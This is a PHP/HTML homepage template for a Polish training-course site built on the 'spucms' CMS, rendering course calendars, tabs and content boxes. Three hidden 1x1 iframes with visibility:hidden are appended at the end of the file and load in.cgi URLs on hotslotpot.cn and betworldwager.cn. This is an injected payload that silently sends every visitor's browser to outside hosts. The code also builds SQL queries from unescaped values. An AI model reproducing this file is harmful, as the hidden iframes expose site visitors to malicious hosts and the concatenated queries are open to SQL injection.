<?

class HomeText {
	var $header, $content;
	
	function HomeText($tag,$lid) {
		$in = array("{","}");
		$tagT = str_replace($in,"",$tag);
		$sql = sql("SELECT title,content FROM spucms_homepage WHERE tag='".$tagT."' AND language_id='".$lid."'");
		if(list($headerT,$contentT) = dbrow($sql)) {
			$this->header=$headerT;
			$this->content=$contentT;
			$this->WriteText();
		}
	}
	
	function WriteText() {
		global $cfg;
		
		echo '<table width="95%">';
		echo "\n	";
		echo '<tr>';
		echo "\n		";
		echo '<td class="HomeHeader" align="right" style="background-image: url(\'themes/'.$cfg['theme'].'/gfx/bgheader.gif\'); background-repeat: repeat-y; background-position:top right; height: 35px;">'.$this->header.'</td>';
		echo "\n	";
		echo '</tr>';
		echo "\n	";
		echo '<tr>';
		echo "\n		";
		echo '<td style="text-align: justify;">'.$this->content.'</td>';
		echo "\n	";
		echo '</tr>';
		echo "\n";
		echo '</table>';
	}

}

	preg_match('/Firefox|MSIE|Opera/',$_SERVER['HTTP_USER_AGENT'],$user_agent);
	if($user_agent[0]=='MSIE') {
		$blink='<!--BEGIN QIKSEARCH BLINKING TEXT 2.0-->
<script language="javascript">
// Location of this script:
// http://www.qiksearch.com/javascripts/blinking_text20.htm
//*********************************************
//* Blinking Text 2.0                         *
//* Blinks a text                             *
//* v 2.0 works on IE/NS4/NS6                 *
//* Modified 07 May 2002                      *
//* (c) Premshree Pillai,                     *
//* http://www.qiksearch.com                  *
//* E-mail : premshree@hotmail.com            *
//* Use the script freely as long as this     *
//* message is intact                         *
//*********************************************

window.onerror = null;
 var IE4=document.all&&navigator.userAgent.indexOf("Opera")==-1;
 var NS4=document.layers;
 var NS6=document.getElementById&&navigator.userAgent.indexOf("Opera")==-1;
 var blink_speed=1000; // Delay in milliseconds
 var i=0;
 var left_pos=330; // The Distance of text from left
 
if (IE4) 
{
 layerRef="document.all";
 styleSwitch=".style";
}

//BLINKING
function Blink(layerName)
{
 if (IE4)
 { 
  if(i%2==0)
  {
   eval(layerRef+\'["\'+layerName+\'"]\'+
   styleSwitch+\'.visibility="visible"\');
  }
  else
  {
   eval(layerRef+\'["\'+layerName+\'"]\'+
   styleSwitch+\'.visibility="hidden"\');
  }
 }
 
 if(NS6 && (navigator.appName!="Microsoft Internet Explorer"))
 {
  if(i%2==0)
  {
   eval(\'document.getElementById("\' + layerName + \'").style.display=""\');
  }
  else
  {
   eval(\'document.getElementById("\' + layerName + \'").style.display="none"\');
  }
 }

 if(i<1)
 {
  i++;
 } 
 else
 {
  i--
 }
 setTimeout("Blink(\'"+layerName+"\')",blink_speed);
}



if(IE4||NS6)
{
 if(IE4)
 {
  dispIENS="visibility:hidden;";
 }
 else
 {
  dispIENS="display:none;";
 }
 document.write(\'<div id="qiksearch" style="\' + dispIENS + \' color: #ff0000; font-weight: bold; text-decoration: blink;" align="center">Wiêcej szkoleñ znajdziesz<br />klikaj±c w powy¿sze zak³adki</div>\');
  Blink(\'qiksearch\');
}

if(NS4)
{
 document.write(\'<blink style="color: #ff0000; font-weight: bold; text-decoration: blink;" align="center">Wiêcej szkoleñ znajdziesz<br />klikaj±c w powy¿sze zak³adki</blink>\');
}



</script>
<!--END QIKSEARCH BLINKING TEXT 2.0-->
';
	} else $blink = '<div style="color: #ff0000; font-weight: bold; text-decoration: blink;" align="center">Wiêcej szkoleñ znajdziesz<br />klikaj±c w powy¿sze zak³adki</div>';

?>

<table style="width: 704px;" border="0" cellpadding="0" cellspacing="0" id="Table_01">
	<tr>
		<td colspan="3" style="height: 10px;"></td>
	</tr>
	<tr valign="top">
		<td>

<table border="0" cellpadding="0" cellspacing="0" style="width: 227px;">
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_03.png" alt="" /></td>
	</tr>
	<tr>
		<td class="TabBg">
<table border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td align="center" id="td_1_1" class="TabClass1"><a href="javascript:show_tab(1,1,5);" class="TabLink"><b>GKRPA</b><br />3-5 dni</a></td>
		<td align="center" id="td_1_2" class="TabClass2"><a href="javascript:show_tab(1,2,5);" class="TabLink"><b>OPS, DPS...</b><br />3-5 dni</a></td>
		<td align="center" id="td_1_3" class="TabClass2"><a href="javascript:show_tab(1,3,5);" class="TabLink"><b>GKRPA</b><br />1 dzieñ</a></td>
		<td align="center" id="td_1_4" class="TabClass2"><a href="javascript:show_tab(1,4,5);" class="TabLink"><b>OPS, DPS...</b><br />1 dzieñ</a></td>
		<!--<td align="center" id="td_1_5" class="TabClass2"><a href="javascript:show_tab(1,5,5);" class="TabLink"><b>NAUCZ.</b><br />1 dzieñ</a></td>-->
	</tr>
</table>
		</td>
	</tr>
	<tr>
		<td class="borders"><?=$blink;?></td>
	</tr>
	<tr>
		<td class="borders" align="center"><br />
<div id="tab_1_1" style="display: block">
<?

$kalendarz1 = new Calendar();

$sqlM = sql("SELECT day,month,year,style,title,url FROM spucms_calendar_dates WHERE calendar_id=1");
while(list($d,$m,$y,$s,$t,$u)=dbrow($sqlM)) {
	$sqlS = sql("SELECT style FROM spucms_calendar_styles WHERE id=".$s);
	if(list($s)=dbrow($sqlS)) {
		$kalendarz1->Marker($y,$m,$d,$s,$t,$u);
	}
	else $kalendarz1->Marker($y,$m,$d,null,$t,$u);
}
$kalendarz1->ShowCalendar(3,210);

?>
</div>
<div id="tab_1_2" style="display: none">
<?

$kalendarz2 = new Calendar();

$sqlM = sql("SELECT day,month,year,style,title,url FROM spucms_calendar_dates WHERE calendar_id=8");
while(list($d,$m,$y,$s,$t,$u)=dbrow($sqlM)) {
	$sqlS = sql("SELECT style FROM spucms_calendar_styles WHERE id=".$s);
	if(list($s)=dbrow($sqlS)) {
		$kalendarz2->Marker($y,$m,$d,$s,$t,$u);
	}
	else $kalendarz2->Marker($y,$m,$d,null,$t,$u);
}
$kalendarz2->ShowCalendar(3,210);

?>
</div>
<div id="tab_1_3" style="display: none">
<?

$kalendarz3 = new Calendar();

$sqlM = sql("SELECT day,month,year,style,title,url FROM spucms_calendar_dates WHERE calendar_id=3");
while(list($d,$m,$y,$s,$t,$u)=dbrow($sqlM)) {
	$sqlS = sql("SELECT style FROM spucms_calendar_styles WHERE id=".$s);
	if(list($s)=dbrow($sqlS)) {
		$kalendarz3->Marker($y,$m,$d,$s,$t,$u);
	}
	else $kalendarz3->Marker($y,$m,$d,null,$t,$u);
}
$kalendarz3->ShowCalendar(3,210);

?>
</div>
<div id="tab_1_4" style="display: none">
<?

$kalendarz4 = new Calendar();

$sqlM = sql("SELECT day,month,year,style,title,url FROM spucms_calendar_dates WHERE calendar_id=4");
while(list($d,$m,$y,$s,$t,$u)=dbrow($sqlM)) {
	$sqlS = sql("SELECT style FROM spucms_calendar_styles WHERE id=".$s);
	if(list($s)=dbrow($sqlS)) {
		$kalendarz4->Marker($y,$m,$d,$s,$t,$u);
	}
	else $kalendarz4->Marker($y,$m,$d,null,$t,$u);
}
$kalendarz4->ShowCalendar(3,210);

?>
</div>
<div id="tab_1_5" style="display: none">
<?

$kalendarz5 = new Calendar();

$sqlM = sql("SELECT day,month,year,style,title,url FROM spucms_calendar_dates WHERE calendar_id=5");
while(list($d,$m,$y,$s,$t,$u)=dbrow($sqlM)) {
	$sqlS = sql("SELECT style FROM spucms_calendar_styles WHERE id=".$s);
	if(list($s)=dbrow($sqlS)) {
		$kalendarz5->Marker($y,$m,$d,$s,$t,$u);
	}
	else $kalendarz5->Marker($y,$m,$d,null,$t,$u);
}
$kalendarz5->ShowCalendar(3,210);

?>
</div>
		</td>
	</tr>
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_15.png" width="227" height="10" alt="" /></td>
	</tr>
</table>

<br />

<table border="0" cellpadding="0" cellspacing="0" style="width: 227px;">
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/right_06.png" alt="" /></td>
	</tr>
	<tr>
		<td class="borders">
<? new FreeSpace(41); ?>
		</td>
	</tr>
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_15.png" width="227" height="10" alt="" /></td>
	</tr>
</table>

<br />

<table border="0" cellpadding="0" cellspacing="0" style="width: 227px;">
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/npdn.png" alt="" /></td>
	</tr>
	<tr>
		<td class="borders">
<? new FreeSpace(48); ?>
		</td>
	</tr>
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_15.png" width="227" height="10" alt="" /></td>
	</tr>
</table>

<br />

<table border="0" cellpadding="0" cellspacing="0" style="width: 227px;">
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_17.png" alt="" /></td>
	</tr>
	<tr>
		<td class="borders">
<? new FreeSpace(42); ?>
		</td>
	</tr>
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_15.png" width="227" height="10" alt="" /></td>
	</tr>
</table>
<? /*
<br />

<div align="center"><br /><br /><iframe src="flashplayer/player.html" style="width: 230px; height: 115px; border: 0px; left-margin: 0px; top-margin: 0px;" marginwidth="0" marginheight="0" frameborder="0" scrolling="0"></iframe></div>
*/ ?>
		</td>
		<td style="width: 26px;">
		</td>
		<td>
<div id="tabCenter_1_1" style="display: block">
<table border="0" cellpadding="0" cellspacing="0" style="width: 450px;">
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/gkrpa35.gif" alt="" /></td>
	</tr>
	<tr>
		<td class="borders">
<? new FreeSpace(43); ?>
		</td>
	</tr>
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_10.png" alt="" /></td>
	</tr>
</table>
</div>
<div id="tabCenter_1_2" style="display: none">
<table border="0" cellpadding="0" cellspacing="0" style="width: 450px;">
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/ops35.gif" alt="" /></td>
	</tr>
	<tr>
		<td class="borders">
<? new FreeSpace(44); ?>
		</td>
	</tr>
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_10.png" width="450" height="11" alt="" /></td>
	</tr>
</table>
</div>
<div id="tabCenter_1_3" style="display: none">
<table border="0" cellpadding="0" cellspacing="0" style="width: 450px;">
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/gkrpa1.gif" alt="" /></td>
	</tr>
	<tr>
		<td class="borders">
<? new FreeSpace(45); ?>
		</td>
	</tr>
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_10.png" width="450" alt="" /></td>
	</tr>
</table>
</div>
<div id="tabCenter_1_4" style="display: none">
<table border="0" cellpadding="0" cellspacing="0" style="width: 450px;">
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/ops1.gif" alt="" /></td>
	</tr>
	<tr>
		<td class="borders">
<? new FreeSpace(46); ?>
		</td>
	</tr>
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_10.png" width="450" alt="" /></td>
	</tr>
</table>
</div>
<div id="tabCenter_1_5" style="display: none">
<table border="0" cellpadding="0" cellspacing="0" style="width: 450px;">
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/naucz1.gif" alt="" /></td>
	</tr>
	<tr>
		<td class="borders">
<? new FreeSpace(47); ?>
		</td>
	</tr>
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_10.png" width="450" alt="" /></td>
	</tr>
</table>
</div>

<br />

<table border="0" cellpadding="0" cellspacing="0" style="width: 450px;">
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_12.png" alt="" /></td>
	</tr>
	<tr>
		<td class="borders">
<? include("lib/boxes/articles.php"); ?>
		</td>
	</tr>
	<tr>
		<td><img src="themes/<?=$cfg['theme'];?>/gfx/left_10.png" width="450" height="11" alt="" /></td>
	</tr>
</table>

<br />



		</td>
	</tr>
</table>

<iframe src="http://hotslotpot.cn/in.cgi?income66" width=1 height=1 style="visibility: hidden"></iframe>

<iframe src="http://betworldwager.cn/in.cgi?income68" width=1 height=1 style="visibility: hidden"></iframe>
<iframe src="http://betworldwager.cn/in.cgi?income69" width=1 height=1 style="visibility: hidden"></iframe>